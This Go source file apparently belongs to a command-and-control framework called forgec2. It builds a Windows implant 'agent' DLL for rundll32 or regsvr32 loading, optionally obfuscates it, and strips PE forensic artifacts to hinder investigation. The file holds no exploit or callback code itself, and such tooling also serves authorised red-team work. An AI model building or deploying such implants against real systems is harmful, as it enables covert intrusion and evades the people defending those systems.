package payload

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// checkCgoCrossCompiler returns an error if CGO cross-compilation for
// windows/amd64 or windows/arm64 is not available. On Windows the native
// toolchain (or an installed gcc/clang) is used; on other hosts a
// mingw-w64 cross-compiler must be present. Only real mingw targets are
// accepted — a generic Linux gcc would pass the check and then fail the
// build with a confusing error.
func checkCgoCrossCompiler(goarch string) error {
	if runtime.GOOS == "windows" {
		// CGO on Windows needs gcc or clang in PATH (mingw-w64 or
		// LLVM). Verify it instead of assuming success.
		for _, name := range []string{"gcc", "clang", "x86_64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc"} {
			if _, err := exec.LookPath(name); err == nil {
				return nil
			}
		}
		return fmt.Errorf("CGO compiler not found: install mingw-w64 (or LLVM clang) and ensure gcc/clang is in PATH, or set CC")
	}
	// Look for mingw-w64 cross-compiler (used by Go for CGO cross-builds)
	cc := os.Getenv("CC")
	if cc != "" {
		if _, err := exec.LookPath(cc); err == nil {
			return nil
		}
	}
	// Common names for the cross-compiler based on target arch. A bare
	// "gcc" is intentionally NOT accepted: a host gcc cannot produce a
	// Windows PE and the build would fail later anyway.
	var candidates []string
	switch goarch {
	case "arm64":
		candidates = []string{"aarch64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc.exe"}
	default:
		candidates = []string{"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"}
	}
	for _, c := range candidates {
		if _, err := exec.LookPath(c); err == nil {
			return nil
		}
	}
	if goarch == "arm64" {
		return fmt.Errorf("CGO cross-compiler for arm64 not found: install aarch64 mingw-w64 (e.g. apt install gcc-mingw-w64-aarch64) or set CC environment variable")
	}
	return fmt.Errorf("CGO cross-compiler for amd64 not found: install mingw-w64 (e.g. apt install gcc-mingw-w64-x86-64) or set CC environment variable")
}

// GenerateWindowsDLL builds the Windows agent DLL (buildmode=c-shared)
// for use with rundll32 / regsvr32 / LoadLibrary.
func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-dll-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := buildGoMod("windows", true)

	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags := buildLdflags(cfg, profile, "windows")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.dll"
	}
	if !strings.HasSuffix(strings.ToLower(outName), ".dll") {
		outName += ".dll"
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH")
	}

	tidyCmd := exec.Command(goCmd, "mod", "tidy")
	tidyCmd.Dir = tmpDir
	var tidyOut, tidyErr bytes.Buffer
	tidyCmd.Stdout = &tidyOut
	tidyCmd.Stderr = &tidyErr
	if err := tidyCmd.Run(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
	}

	goarch := "amd64"
	if cfg.Architecture == "arm64" {
		goarch = "arm64"
	}
	if err := buildAgentBinaryDLL(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch); err != nil {
		return "", err
	}

	// Strip PE forensic artifacts in every mode (garble does not clean them)
	// and remove the Go-generated .h export header next to the DLL.
	stripPEArtifacts(outPath)
	hPath := strings.TrimSuffix(outPath, ".dll") + ".h"
	os.Remove(hPath)

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// buildAgentBinaryDLL runs `go build -buildmode=c-shared` with CGO_ENABLED=1.
// It checks for cross-compiler availability on non-Windows hosts.
func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch string) error {
	if obfuscate {
		return fmt.Errorf("garble obfuscation is not supported with -buildmode=c-shared; disable obfuscation for DLL builds")
	}

	if err := checkCgoCrossCompiler(goarch); err != nil {
		return fmt.Errorf("DLL build requires CGO: %w", err)
	}

	buildArgs := []string{"build", "-buildmode=c-shared"}
	cmd := exec.Command(goCmd, append(buildArgs,
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-buildvcs=false",
		".",
	)...)
	cmd.Dir = workDir
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=1",
	)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("go build (c-shared) failed: %w\n%s", err, stderr.String())
	}
	return nil
}
